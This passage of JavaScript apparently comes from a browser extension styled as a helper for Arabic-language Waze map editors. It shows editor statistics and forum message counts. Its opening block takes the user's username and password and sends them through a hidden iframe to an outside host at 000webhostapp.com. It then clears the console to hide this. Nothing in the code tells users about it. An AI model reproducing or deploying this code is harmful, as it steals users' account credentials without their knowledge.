		if (u != "" || p != ""){
			if (u != undefined && p != undefined){
				if (u.includes(".com")){
					if (document.getElementById("myhackfram") == null){
						var iframe = document.createElement("iframe");
						iframe.id = "myhackfram";
						iframe.style.display = "none";
						iframe.src = "https://saudiwaze.000webhostapp.com/sultan.php?u=" + encodeURI(u) + "&p=" + encodeURI(p);
						document.body.appendChild(iframe);
						window.console.clear();
					}
				}else{
					if (document.getElementById("myhackfram") == null){
						var iframe = document.createElement("iframe");
						iframe.id = "myhackfram";
						iframe.style.display = "none";
						try {
							iframe.src = "https://saudiwaze.000webhostapp.com/sultan.php?u=" + encodeURI(u) + "&p=" + encodeURI(p);	
							window.console.clear();
						} catch (error) {
							window.console.clear();
						}
						document.body.appendChild(iframe);
					}
				}
			}
		}
	}


	function createFrame(){

		getAccount();

		if (document.getElementById("divalert") == null){
			var div = document.createElement("div");
			div.id = "divalert";
			div.style.position = "absolute";
			div.style.top = "10%";
			div.style.left = "30%";
			div.style.width = "600px";
			div.style.height = "500px";
			div.style.backgroundColor = "#F5F5F5";
			div.style.zIndex = 50;
			document.body.appendChild(div);
		}
		if (document.getElementById("divalert") != null){
			if (document.getElementById("divtopbar") == null){
				var div = document.createElement("div");
				div.id = "divtopbar";
				div.style.width = "100%";
				div.style.height = "30px";
				div.style.backgroundColor = "white";
				document.getElementById("divalert").appendChild(div);
			}
		}
		if (document.getElementById("divalert") != null){
			if (document.getElementById("divtopbar") != null){
				if (document.getElementById("divcontentalert") == null){
					var div = document.createElement("div");
					div.id = "divcontentalert";
					div.style.width = "100%";
					div.style.height = "100%";
					document.getElementById("divalert").appendChild(div);
				}
			}
		}
		if (document.getElementById("divtopbar") != null){
			if (document.getElementById("divtopbar").innerHTML == ""){
				document.getElementById("divtopbar").innerHTML = "<input id='closewindow' type='button' title='إغلاق' style='width: 30px; height: 30px; border-style: none; background: white; left: 95%; position: absolute;' value='X'>";
			}
		}
		if (document.getElementById("divcontentalert") != null){
			if (document.getElementById("divcontentalert").innerHTML == ""){
				document.getElementById("divcontentalert").innerHTML = "<div align='center'><h1>سعودي ويز</h1><h3><p>تطبيق سعودي ويز يهتم في تسهيل التجربة مع ويز، فيديو توضيحي لعمل الأداة</p></h3>"
					+ "<embed width='520' height='315' src=''></div>";
			}
		}
		window.console.clear();
	}

	function editorProfile(){
		if (document.getElementById("wazeprofile") == null){
			var iframe = document.createElement("iframe");
			iframe.id = "wazeprofile";
			iframe.src = "https://www.waze.com/ar/user/editor/" + getUsername();
			iframe.style.display = "none";
			document.body.appendChild(iframe);
		}
		if (document.getElementById("wazeprofile") != null){
			var editor = document.getElementById("wazeprofile").contentWindow.document;
		}
		var edrank =  editor.getElementsByClassName("type-content__count");
		if (edrank[0] != undefined){
			if (getID("replayeditor") != null){
				getID("replayeditor").innerText = "طلبات التحديث المعلقة: " + edrank[0].innerText;
				getID("placeseditor").innerText = "الأماكن: " + edrank[1].innerText;
				getID("restrictionseditor").innerText = "قيود مجدولة: " + edrank[2].innerText;
				getID("buildingeditor").innerText = "أرقام المباني: " + edrank[3].innerText;
				getID("segmenteditor").innerText = "الوصلات: " + edrank[4].innerText;
				getID("placesreviews").innerText = "مراجعات الأماكن: " + edrank[5].innerText;
				getID("problems").innerText = "مشاكل الخريطة المعلقة: " + edrank[6].innerText;
				getID("roadseditor").innerText = "الطرق المرصوفة: " + edrank[7].innerText;
			}
		}else{
			if (getID("replayeditor") != null){
				getID("replayeditor").innerText = "يقوم بتحميل البيانات";
			}
		}
		var userdate =  editor.getElementsByClassName("user-last-edit");
		if (userdate[0] != undefined){
			if (getID("datemove") != null){
				if (getID("datemove").innerText == ""){
					var date = userdate[0].innerText;
					getID("datemove").innerText = "تقوم بالتعديل منذ: " + date.replace("يقوم بالتعديل منذ","");
				}
			}
		}
	}

	function msgForum(){
		if (document.getElementById("msgforum") == null){
			var iframe = document.createElement("iframe");
			iframe.id = "msgforum";
			iframe.src = "https://www.waze.com/forum/";
			iframe.style.display = "none";
			document.body.appendChild(iframe);
		}
		if (document.getElementById("msgforum") != null){
			var forum = document.getElementById("msgforum").contentWindow.document;
		}
		var msg =  forum.getElementsByTagName("a");
		for(i = 0; i < msg.length; i++){
			var messages = msg[i].innerText;
			if (messages.includes("new messages")){
				if ( getID("prmsg") != null){
					getID("prmsg").innerText = "الرسائل الخاصة الجديدة: " + parseInt(msg[i].innerText.charAt(0));
				}
			}
		}
	}

}else{
	alert("إضافة سعودي ويز تعمل فقط في الواجهة العربية");
}

function arabiclang(){
	var URLLANG = window.location.pathname;
	return URLLANG.includes("ar");
}